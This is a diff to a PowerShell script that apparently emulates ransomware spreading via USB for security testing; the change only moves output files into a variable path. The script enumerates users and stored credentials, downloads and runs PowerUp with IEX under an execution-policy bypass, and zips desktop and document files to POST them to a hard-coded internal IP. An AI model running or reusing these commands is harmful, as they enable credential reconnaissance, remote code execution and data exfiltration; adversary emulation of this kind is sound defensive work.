@@ -1,5 +1,7 @@
 # Powershell script to simulate Ransomware Spread via USB
 
+$outfile = "C:\Windows\temp"
+
 Write-Host "[+] Attack Started ..........." -ForegroundColor Green
 $RemovableDrives=@()
 $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
@@ -11,22 +13,22 @@ New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 
 Start-Sleep -S 5
 
 Write-Host "[+] Windows Enumeration" -ForegroundColor Green
-net user | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-ls c:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-cmdkey.exe /list | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-get-localuser | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-get-localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-net localgroup "Users" | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-net localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-get-localgroupmember -group Users | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-get-childitem C:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath C:\temp\Powerup.txt"
+net user | Out-File -FilePath "$outfile\Localenum.txt" -Append
+ls c:\Users\ | Out-File -FilePath "$outfile\Localenum.txt" -Append
+cmdkey.exe /list | Out-File -FilePath "$outfile\Localenum.txt" -Append
+get-localuser | Out-File -FilePath "$outfile\Localenum.txt" -Append
+get-localgroup | Out-File -FilePath "$outfile\Localenum.txt" -Append
+net localgroup "Users" | Out-File -FilePath "$outfile\Localenum.txt" -Append
+net localgroup | Out-File -FilePath "$outfile\Localenum.txt" -Append
+get-localgroupmember -group Users | Out-File -FilePath "$outfile\Localenum.txt" -Append
+get-childitem C:\Users\ | Out-File -FilePath "$outfile\Localenum.txt" -Append
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath $outfile\Powerup.txt"
 Start-Sleep -S 5
 
 Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
 # Exfil will fail due to IP address
-Get-Content C:\temp\Powerup.txt, C:\temp\Localenum.txt | Set-Content C:\temp\exfilFile.txt
-$content = Get-Content C:\temp\exfilFile.txt
+Get-Content $outfile\Powerup.txt, $outfile\Localenum.txt | Set-Content $outfile\exfilFile.txt
+$content = Get-Content $outfile\exfilFile.txt
 Invoke-WebRequest -Uri 172.31.33.33 -Method POST -Body $content
 
 Start-Sleep -S 5
@@ -709,11 +711,11 @@ Start-Sleep -S 15
 
 Write-Host "[+] Preparing Files" -ForegroundColor Green
 $files = "C:\Users\$env:USERNAME\Desktop\Ransom.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom1.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom2.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom3.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom4.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom6.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom7.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom8.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom9.lnk", "C:\Users\$env:USERNAME\Documents\SecretStuff.txt"
-Compress-Archive -LiteralPath $files -DestinationPath C:\temp\Ransom_Data.zip
+Compress-Archive -LiteralPath $files -DestinationPath $outfile\Ransom_Data.zip
 
 Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
 # Exfil will fail due to IP address
-$content1 = Get-Content C:\temp\Ransom_Data.zip
+$content1 = Get-Content $outfile\Ransom_Data.zip
 Invoke-WebRequest -Uri 172.31.33.33 -Method POST -Body $content1
 
 Start-Sleep -S 5
